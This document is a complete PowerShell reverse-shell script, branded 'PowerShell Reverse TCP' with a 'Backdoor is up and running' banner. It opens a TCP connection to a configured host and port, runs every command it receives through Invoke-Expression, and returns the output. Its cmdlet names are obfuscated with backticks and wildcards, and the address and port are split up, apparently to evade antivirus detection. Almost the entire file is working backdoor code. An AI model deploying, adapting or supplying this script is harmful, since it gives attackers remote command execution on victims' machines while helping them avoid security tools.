$a = "127" + "." + "0" + "." + "0" + "." + "1";
$p = 1000 + 1000 + 1000 + 6000;
$s = $null;
$st = $null;
$b = $null;
$w = $null;
$r = $null;
$d = $null;
$re = $null;
try {
	$s = (& (`G`C`M *ke-E*) '& (`G`C`M *w-O*) `N`E`T`.`S`O`C`K`E`T`S`.`T`C`P`C`L`I`E`N`T($a, $p)');
	& (`G`C`M *e-Ho??) "########################################################################";
	& (`G`C`M *e-Ho??) "#                                                                      #";
	& (`G`C`M *e-Ho??) "#                        PowerShell Reverse TCP                        #";
	& (`G`C`M *e-Ho??) "#                                          by Ivan Sincek              #";
	& (`G`C`M *e-Ho??) "#                                                                      #";
	& (`G`C`M *e-Ho??) "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
	& (`G`C`M *e-Ho??) "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
	& (`G`C`M *e-Ho??) "#                                                                      #";
	& (`G`C`M *e-Ho??) "########################################################################";
	& (`G`C`M *e-Ho??) "Backdoor is up and running...";
	$st = $s.GetStream();
	$b = & (`G`C`M *w-O*) Byte[] (1000 + 12 + 12);
	$e = & (`G`C`M *w-O*) Text.AsciiEncoding;
	$w = (& (`G`C`M *ke-E*) '& (`G`C`M *w-O*) `I`O`.`S`T`R`E`A`M`W`R`I`T`E`R($st)');
	$w.AutoFlush = $true;
	do {
		$w.Write("PS>");
		do {
			$r = $st.Read($b, 0, $b.Length);
			if ($r -gt 0) {
				$d = $d + $e.GetString($b, 0, $r).Replace("`r`n", "").Replace("`n", "");
			} else {
				$d = "exit";
			}
		} while ($st.DataAvailable);
		if ($d -ne "" -and $d -ne "exit") {
			try {
				$re = (& (`G`C`M *ke-E*) $d | & (`G`C`M *ut-S*));
			} catch {
				$re = $_.Exception.InnerException.Message;
			}
			$w.WriteLine($re);
			& (`G`C`M *r-Va*) -name "d";
		}
	} while ($d -ne "exit");
} catch {
	& (`G`C`M *e-Ho??) $_.Exception.InnerException.Message;
} finally {
	if ($s -ne $null) {
		$s.Close();
		$s.Dispose();
	}
	if ($st -ne $null) {
		$st.Close();
		$st.Dispose();
	}
	if ($b -ne $null) {
		$b.Clear();
	}
	if ($w -ne $null) {
		$w.Close();
		$w.Dispose();
	}
	if ($r -ne $null) {
		& (`G`C`M *r-Va*) -name "r";
	}
	if ($d -ne $null) {
		& (`G`C`M *r-Va*) -name "d";
	}
	if ($re -ne $null) {
		& (`G`C`M *r-Va*) -name "re";
	}
}
